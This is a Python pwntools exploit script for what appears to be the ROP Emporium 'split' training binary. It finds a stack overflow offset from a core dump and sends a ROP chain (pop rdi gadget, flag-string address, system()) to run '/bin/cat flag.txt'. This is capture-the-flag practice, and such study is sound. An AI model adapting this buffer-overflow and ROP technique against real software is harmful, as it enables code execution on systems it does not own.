from pwn import *
context.terminal = "st"

elf = context.binary = ELF("split")

# Enable verbose log level
context.log_level = 'debug'

io = process(elf.path)

io.recvuntil(">")
io.sendline(cyclic(128))
io.wait()

core = io.corefile
stack_addr = core.rsp
rdi_addr = core.rdi
info("%#x stack address", stack_addr)
# reading 4 bytes from the top stack
pattern_stack = core.read(stack_addr, 4)
info("%r stack contents", pattern_stack)

# The /bin/cat flag.txt string address
flag_addr = p64(0x00601060)
# Gadget address
pop_rdi = p64(0x00000000004007c3)
offset = cyclic_find(bytes(pattern_stack))
# system address
sys_addr = p64(elf.symbols.system)

payload = [
        b"A"*offset,
        pop_rdi,
        flag_addr,
        sys_addr
        ]

payload = b"".join(payload)
io = process(elf.path)
gdb.attach(io,"""
        br *pwnme+89
        c
""")
io.sendline(payload)
io.interactive()
